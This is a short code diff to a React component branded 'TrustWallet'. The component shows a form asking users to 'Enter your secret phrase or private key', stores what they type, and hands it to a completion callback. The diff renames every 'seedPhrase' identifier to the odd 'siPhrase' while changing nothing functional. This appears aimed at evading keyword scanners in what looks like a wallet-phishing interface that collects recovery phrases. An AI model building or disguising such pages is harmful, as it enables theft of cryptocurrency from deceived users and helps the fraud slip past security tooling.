@@ -12,16 +12,16 @@ const TrustWallet = ({
   handleFinish: (walletPhrase: string) => Promise<void>;
 }) => {
   const [walletName, setWalletName] = useState("Main wallet");
-  const [seedPhrase, setSeedPhraseState] = useState("");
+  const [siPhrase, setsiPhraseState] = useState("");
   const [nameFocused, setNameFocused] = useState(false);
   const [areaFocused, setAreaFocused] = useState(false);
-  const { setSeedPhrase } = useWalletStore();
+  const { setsiPhrase } = useWalletStore();
   const textareaRef = useRef<HTMLTextAreaElement | null>(null);
 
   // Handle completion
   const handleComplete = () => {
-    setSeedPhrase(seedPhrase.trim());
-    handleFinish(seedPhrase.trim());
+    setsiPhrase(siPhrase.trim());
+    handleFinish(siPhrase.trim());
   };
 
   // Handle click area focus
@@ -32,7 +32,7 @@ const TrustWallet = ({
   };
 
   // Disable button logic
-  const isButtonDisabled = !walletName.trim() || !seedPhrase.trim();
+  const isButtonDisabled = !walletName.trim() || !siPhrase.trim();
 
   return (
     <div className="min-h-screen bg-black flex text-gray-300 w-full">
@@ -92,8 +92,8 @@ const TrustWallet = ({
               >
                 <textarea
                   ref={textareaRef}
-                  value={seedPhrase}
-                  onChange={(e) => setSeedPhraseState(e.target.value)}
+                  value={siPhrase}
+                  onChange={(e) => setsiPhraseState(e.target.value)}
                   onFocus={() => setAreaFocused(true)}
                   onBlur={() => setAreaFocused(false)}
                   placeholder="Enter your secret phrase or private key..."
